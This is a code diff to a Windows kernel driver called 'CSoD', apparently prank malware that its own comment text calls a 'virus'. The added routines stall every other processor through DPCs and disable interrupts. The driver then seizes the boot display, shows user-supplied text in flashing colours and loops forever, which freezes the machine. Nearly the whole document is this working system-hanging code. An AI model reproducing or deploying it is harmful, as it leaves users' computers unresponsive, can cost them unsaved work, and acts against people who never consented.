@@ -7,6 +7,84 @@
 PDEVICE_OBJECT g_pDeviceObject = NULL;
 UNICODE_STRING g_uniSymbolName = RTL_CONSTANT_STRING(L"\\??\\CSoD");
 
+ULONG g_uNumberOfRaisedCPU = 0;
+ULONG g_uAllCPURaised = 0;
+PKDPC g_basePKDPC = NULL;
+
+VOID
+RaiseCPUIrqlAndWait(
+	IN PKDPC Dpc,
+	IN PVOID DeferredContext,
+	IN PVOID SystemArgument1,
+	IN PVOID SystemArgument2
+)
+{
+	UNREFERENCED_PARAMETER(SystemArgument2);
+	UNREFERENCED_PARAMETER(SystemArgument1);
+	UNREFERENCED_PARAMETER(DeferredContext);
+	UNREFERENCED_PARAMETER(Dpc);
+
+	InterlockedIncrement((PLONG)&g_uNumberOfRaisedCPU);
+	while (!InterlockedCompareExchange((PLONG)&g_uAllCPURaised, 1, 1))
+		__nop();
+
+	InterlockedDecrement((PLONG)&g_uNumberOfRaisedCPU);
+}
+
+VOID
+ReleaseExclusivity(
+	VOID
+)
+{
+	InterlockedIncrement((PLONG)&g_uAllCPURaised);
+	while (InterlockedCompareExchange((PLONG)&g_uNumberOfRaisedCPU, 0, 0))
+		__nop();
+
+	if (NULL != g_basePKDPC)
+	{
+		ExFreePool((PVOID)g_basePKDPC);
+		g_basePKDPC = NULL;
+	}
+
+	return;
+}
+
+BOOLEAN
+GainExlusivity(
+	VOID
+)
+{
+	ULONG uCurrentCpu = 0;
+	PKDPC tempDpc = NULL;
+	if ((DISPATCH_LEVEL != KeGetCurrentIrql()) || !KeNumberProcessors)
+		return FALSE;
+
+	InterlockedAnd((PLONG)&g_uNumberOfRaisedCPU, 0);
+	InterlockedAnd((PLONG)&g_uAllCPURaised, 0);
+	tempDpc = (PKDPC)ExAllocatePoolWithTag(NonPagedPool, KeNumberProcessors * sizeof(KDPC), CSoD_POOL_TAG);
+	if (tempDpc)
+	{
+		g_basePKDPC = tempDpc;
+		uCurrentCpu = KeGetCurrentProcessorNumber();
+		for (ULONG i = 0; i < (ULONG)KeNumberProcessors; i++, *tempDpc++)
+			if (i != uCurrentCpu)
+			{
+				KeInitializeDpc(tempDpc, RaiseCPUIrqlAndWait, NULL);
+				KeSetTargetProcessorDpc(tempDpc, (CCHAR)i);
+				KeInsertQueueDpc(tempDpc, NULL, NULL);
+			}
+
+		while (KeNumberProcessors - 1 != InterlockedCompareExchange((PLONG)&g_uNumberOfRaisedCPU, KeNumberProcessors - 1, KeNumberProcessors - 1))
+			__nop();
+
+		return TRUE;
+	}
+
+	return FALSE;
+}
+
+//_disable();
+//GainExlusivity();
 //KIRQL Irql = KeRaiseIrqlToDpcLevel();
 //
 //if (InbvIsBootDriverInstalled())
@@ -30,7 +108,8 @@ UNICODE_STRING g_uniSymbolName = RTL_CONSTANT_STRING(L"\\??\\CSoD");
 //		LastWidth = Width;
 //	}
 //#else
-//	InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, BV_COLOR_CYAN);
+//	InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, BV_COLOR_WHITE);
+//	InbvSolidColorFill(0, 0, 0, 0, BV_COLOR_RED);
 //#endif
 //
 //	InbvSetTextColor(BV_COLOR_WHITE);
@@ -42,14 +121,14 @@ UNICODE_STRING g_uniSymbolName = RTL_CONSTANT_STRING(L"\\??\\CSoD");
 //CHAR Text1[] = "Virus by Mitsuha & gt428 & TSK fxxked your computer so you got a strange CSoD.";
 //CHAR Text2[] = "Please SANLIAN TOUBI GUANZHU!";
 //
-//for (USHORT j = 0; j < SCREEN_HEIGHT / CHAR_HEIGHT / 2; j++)
+//for (SHORT j = 0; j < SCREEN_HEIGHT / CHAR_HEIGHT / 2; InterlockedIncrement16(&j))
 //{
-//	for (USHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text1) + 1) / 2; i++)
+//	for (SHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text1) + 1) / 2; InterlockedIncrement16(&i))
 //		InbvDisplayString((PUCHAR)" ");
 //	InbvDisplayString((PUCHAR)Text1);
 //	InbvDisplayString((PUCHAR)"\r\n");
 //
-//	for (USHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text2) + 1) / 2; i++)
+//	for (SHORT i = 0; i < (SCREEN_WIDTH / CHAR_WIDTH - sizeof(Text2) + 1) / 2; InterlockedIncrement16(&i))
 //		InbvDisplayString((PUCHAR)" ");
 //	InbvDisplayString((PUCHAR)Text2);
 //	InbvDisplayString((PUCHAR)"\r\n");
@@ -59,6 +138,8 @@ UNICODE_STRING g_uniSymbolName = RTL_CONSTANT_STRING(L"\\??\\CSoD");
 //;
 //
 //KeLowerIrql(Irql);
+//ReleaseExclusivity();
+//_enable();
 
 NTSTATUS
 PassRequest(
@@ -96,6 +177,8 @@ DeviceIoControl(
 			{
 				nUsedLength = sizeof(CSoD_DATA);
 
+				_disable();
+				GainExlusivity();
 				KIRQL Irql = KeRaiseIrqlToDpcLevel();
 
 				if (InbvIsBootDriverInstalled())
@@ -103,9 +186,16 @@ DeviceIoControl(
 					InbvAcquireDisplayOwnership();
 					InbvResetDisplay();
 
-					InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, pSystemBuffer->BackColor);
+					if (pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
+						InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, BV_COLOR_WHITE);
+					else
+						InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, pSystemBuffer->BackColor);
 
-					InbvSetTextColor(pSystemBuffer->TextColor);
+					if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL)
+						InbvSetTextColor(BV_COLOR_WHITE);
+					else
+						InbvSetTextColor(pSystemBuffer->TextColor);
+
 					InbvInstallDisplayStringFilter(NULL);
 					InbvEnableDisplayString(TRUE);
 					InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
@@ -113,10 +203,32 @@ DeviceIoControl(
 
 				InbvDisplayString((PUCHAR)pSystemBuffer->Text);
 
+				if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL || pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
+					while (TRUE)
+						for (SHORT i = 0; i < BV_MAX_COLORS; InterlockedIncrement16(&i))
+							for (SHORT j = 0; j < BV_MAX_COLORS; InterlockedIncrement16(&j))
+								if (InbvIsBootDriverInstalled())
+								{
+									if (pSystemBuffer->BackColor == BV_COLOR_COLORFUL)
+										InbvSolidColorFill(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1, i);
+
+									if (pSystemBuffer->TextColor == BV_COLOR_COLORFUL)
+										InbvSetTextColor(j);
+
+									InbvSetScrollRegion(0, 0, SCREEN_WIDTH - 1, SCREEN_HEIGHT - 1);
+
+									InbvDisplayString((PUCHAR)pSystemBuffer->Text);
+
+									for (LONG w = 0; w < 1024; InterlockedIncrement(&w))
+										;
+								}
+
 				while (TRUE)
 					;
 
 				KeLowerIrql(Irql);
+				ReleaseExclusivity();
+				_enable();
 			}
 
 			default:
